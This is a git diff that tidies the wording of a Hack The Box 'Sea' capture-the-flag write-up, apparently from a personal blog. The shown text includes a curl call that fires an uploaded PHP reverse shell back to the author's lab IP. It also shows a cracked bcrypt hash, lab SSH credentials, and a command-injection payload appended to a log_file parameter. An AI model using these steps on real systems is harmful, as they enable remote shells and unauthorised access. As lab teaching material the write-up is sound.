@@ -6,6 +6,7 @@ pubDate: 2020-03-02T00:00:00Z
 // imgSrc: '/assets/images/image-post5.jpeg'
 imgSrc: 'https://labs.hackthebox.com/storage/avatars/0011f6725aed869f8683589cb08c90d0.png'
 imgAlt: 'Image post 5'
+tags: ['htb', 'linux', 'easy', 'rce', 'privesc']
 ---
 
 
@@ -15,12 +16,9 @@ by Roqeeb
 **Difficulty:** Easy  
 **IP Address:** 10.10.11.28
 
-This writeup might be a bit wordy here and there , and a bit on the nose on a particular aspect sometimes, that because i was writing it while solving the box
+This writeup might be a bit wordy here and there, and a bit on the nose at times — that's because I was writing it while solving the box.
 enjoy
 
-## Enumeration
-
-We'll begin by scanning the target IP address, `10.10.11.28`, to identify open ports and services running on the Sea box.
 ## Enumeration
 
 As usual, I'll start by using `rustscan` in combination with `nmap` to quickly identify open ports and gather detailed service information.
@@ -67,7 +65,7 @@ So, just **Port 22 (SSH)** and **Port 80 (HTTP)** running `nginx`. The site titl
 
 So, just **Port 22 (SSH)** and **Port 80 (HTTP)** running `nginx`. The site title showed as *Editorial Tiempo Arriba*, which matches the biking theme I saw earlier.
 
-i also started an active spider on burpsuite just in case
+I also started an active spider on Burp Suite, just in case.
 ### Exploring the Website
 
 While browsing around the site, I found a "How to Participate" page. This page had a link that led me to `sea.htb/contact.php`.
@@ -212,7 +210,7 @@ Since the method in the exploit was complex, I opted to use curl to access the w
 ````
 curl "http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.18&lport=4444"
 ````
-the commond worked and i got a reverse shell
+The command worked and I got a reverse shell.
 
 
 ![2024-08-13_13-15](https://github.com/user-attachments/assets/b9a8ab01-6126-484a-9e74-b4d3addba8ad)
@@ -234,7 +232,7 @@ Here's a screenshot of the hash found in `database.js`:
 
 I was trying to crack the following bcrypt hash using `john`:
 
-However, john was giving me errors.I noticed that the hash had backslashes escaping the forward slashes, which might have been causing the issue, so I corrected the hash by removing the backslashes. The correct bcrypt hash should have forward slashes (/) without being escaped by backslashes (\). Here's a comparison:
+However, John was giving me errors. I noticed that the hash had backslashes escaping the forward slashes, which might have been causing the issue, so I corrected the hash by removing the backslashes. The correct bcrypt hash should have forward slashes (/) without being escaped by backslashes (\). Here's a comparison:
 
 ```
     Original Hash:
@@ -243,17 +241,17 @@ However, john was giving me errors.I noticed that the hash had backslashes escap
     Corrected Hash:
     $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q
 ```
-and john sucessfully cracked the hash
+And John successfully cracked the hash.
 
 ![pass](https://github.com/user-attachments/assets/2fac0a66-c5a9-4211-a995-71624529fe5f)
 
-Gaining Access via SSH
+### Gaining Access via SSH
 
-I discovered two users on the host: amay and geo. I tried the cracked password for both users via SSH, and it worked for amay.
-Post-Exploration
+I discovered two users on the host: `amay` and `geo`. I tried the cracked password for both via SSH, and it worked for `amay`.
 
-Once I gained shell access as the amay user, I ran linpeas to enumerate potential privilege escalation paths.
-While checking open ports on the machine, I noticed that port 8080 was open. Suspecting it might be a web service, I tried to access it using curl:
+### Post-Exploitation
+
+Once I gained shell access as `amay`, I ran linpeas to enumerate potential privilege escalation paths. While checking open ports, I noticed that port 8080 was open. Suspecting it might be a web service, I tried to access it using curl:
 ```
 amay@sea:/tmp$ curl http://127.0.0.1:8080/
 Unauthorized access
@@ -268,15 +266,14 @@ After setting up the port forwarding, I accessed http://127.0.0.1:8080/ on my we
 ![port8080](https://github.com/user-attachments/assets/cc10eb7d-2de0-44d4-bc38-aff882f42f83)
 
 
-Nmap Scan and Login Attempt
-
+### Nmap Scan and Login Attempt
 
 I ran an Nmap scan on the forwarded port to gather more information:
 ```
 PORT     STATE  SERVICE    REASON       VERSION
 8080/tcp closed http-proxy conn-refused
 ```
-i tried logging in using the credentials amay:mychemicalromance, and it worked. no cause for alarm
+I tried logging in using the credentials `amay:mychemicalromance`, and it worked. No cause for alarm.
 ### Discovering Another Web Service
 
 ![home](https://github.com/user-attachments/assets/3b51e29a-e98a-404d-a79b-f331e3903d5d)
@@ -284,7 +281,7 @@ i tried logging in using the credentials amay:mychemicalromance, and it worked. 
 
  I discovered another web service that appeared to be a system monitor for internal services. It displayed disk usage and had some system management functions. I was pretty exhausted at this point and wasn't eager to dive into testing yet another web service, so I started clicking buttons hoping for something useful.
 
-One of the options was "Analyse Files" on `access.log`, but it returned a huge amount of logs ,yeah i ain reading allat. I opened Burp Suite to intercept the requests, but realized my proxy wasn't working. It took me a moment to remember that I was port forwarding using Burp's default proxy port, so I had to create a new proxy for port 8081 and update Burp Suite accordingly.
+One of the options was "Analyse Files" on `access.log`, but it returned a huge amount of logs — yeah, I ain't reading all that. I opened Burp Suite to intercept the requests, but realized my proxy wasn't working. It took me a moment to remember that I was port forwarding using Burp's default proxy port, so I had to create a new proxy for port 8081 and update Burp Suite accordingly.
 
 Once I intercepted the request, I noticed something interesting:
 
@@ -300,12 +297,13 @@ Finally, I attempted to read `root.txt` but was met with an unexpected message:
 ![suspic](https://github.com/user-attachments/assets/e98eba5e-2a6e-41d1-bdb0-bb65848e982f)
 
 
-It seemed that the web service required "suspicious traffic" before it shows the contents of the file. hmmm
-i tried inserting null byte at the end of the file name maybe it'll trigger something
+It seemed that the web service required "suspicious traffic" before it would show the file contents. Hmm.
+
+I tried inserting a null byte at the end of the file name to see if it would trigger something:
 ```
 log_file=%2froot%2froot.txt%00&analyze_log=
 ```
-i was about to open payload all the things then it occured to me to try a simple command injection, i was not not trying to bypass i was trying to br flagged,so i appended ';ls'
+I was about to open "Payload All The Things" when it occurred to me to try a simple command injection. I wasn't trying to bypass anything — I was trying to get flagged — so I appended `;ls`.
 
 ![nice2](https://github.com/user-attachments/assets/6ef6421d-0594-453b-b960-e090211c631b)
 
